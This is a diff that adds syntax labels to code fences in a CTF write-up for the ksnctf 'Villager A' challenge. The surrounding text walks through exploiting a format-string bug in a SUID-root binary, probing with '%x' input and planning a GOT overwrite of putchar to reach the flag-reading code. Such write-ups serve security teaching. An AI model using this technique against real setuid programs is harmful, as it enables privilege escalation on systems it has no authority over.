@@ -11,7 +11,7 @@ title: ksnctf Villager A write-up
 Using given information, access to the server `ssh -p 10022 q4@ctfq.sweetduet.info`  
 In the server, you can find  
 
-```
+```bash
 [q4@localhost ~]$ ls -al
 total 36
 drwxr-xr-x.  2 root root 4096 May 22  2012 .
@@ -45,7 +45,7 @@ I see. Good bye.
 ### __Analyze__  
 Since I don't have an access to read flag.txt, it seems that I need to somehow exploit q4 (SUID=root) to read the file. Let's disassemble main().  
 
-```
+```assembly
 ...
 0x080485e4 <+48>:	call   0x8048484 <fgets@plt>
 0x080485e9 <+53>:	mov    DWORD PTR [esp],0x80487b6
@@ -78,7 +78,7 @@ hello
 It seems that at \<main+48\>, `fgets()` is called to get a string from stdin; at \<main+72\>, `printf()` is called to output the string. But, it's kind of weird that `printf()` was called at \<main+60\> to output "Hi, ", and after that, `putchar()` was called to output "\n" (0xa). Why are they called separately, instead of calling just one like `printf("Hi, %s\n", input);` as you probably more familiar to write. Now, I'm getting suspicious that there is a format string vulnerability in this program. (I mean, it's a CTF program)  
 What if I input some kind of *format string* at \<main+48\>?  
 
-```
+```bash
 [q4@localhost ~]$ ./q4
 What's your name?
 sirius%x%x%x
@@ -89,7 +89,7 @@ Do you want the flag?
 
 It's now clear that there is a format string vulnerability at __<main+72>__. So, let's think about how to exploit it to read flag.txt.  
   
-```
+```assembly
 ...
 0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
 0x08048608 <+84>:	call   0x8048474 <putchar@plt>
@@ -119,7 +119,7 @@ It's now clear that there is a format string vulnerability at __<main+72>__. So,
 Realize that 0x1 is moved into [esp+0x418] right before the jump to \<main+205\>. Then, 0x1 is brought back to eax, followed by `jne` at \<main+219\> -- if the value of eax is not 0 (or ZF = 0), it jumps to \<main+102\> that is a loop asking "Do you want the flag?", as shown below.  
 
 
-```
+```assembly
 ...
 0x0804861a <+102>:	mov    DWORD PTR [esp],0x80487bb
 0x08048621 <+109>:	call   0x80484c4 <puts@plt>
@@ -157,7 +157,7 @@ Remember that ASLR doesn't disable the randomization of memory address of code s
 Right after the format string vulnerability, `putchar@plt` is called, using PLT. That means, if I modify the address referred at `putchar@plt` to \<main+221\>, I can modify `eip`!  
 Let's examine.   
 
-```
+```assembly
 ...
 0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
 => 0x08048608 <+84>:	call   0x8048474 <putchar@plt>
@@ -181,7 +181,7 @@ End of assembler dump.
 So, it seems that if I change the value stored at __0x80499e0__ to be __0x08048691__ (\<main+219\>), I can read flag.txt.  
   
 
-```
+```bash
 [q4@localhost ~]$ ./q4
 What's your name?
 AAAA%x.%x.%x.%x.%x.%x.%x.%x.
@@ -193,7 +193,8 @@ As examining the format vulnerability, it seems that the input string is stored 
 
 
 ### __GETTING THE FLAG__
-Now, we got all the informatin needed.
+Now, we got all the informatin needed.  
+
 + modify the value at __0x80499e0__ to __0x8048691__  
 + offset is 6  
 
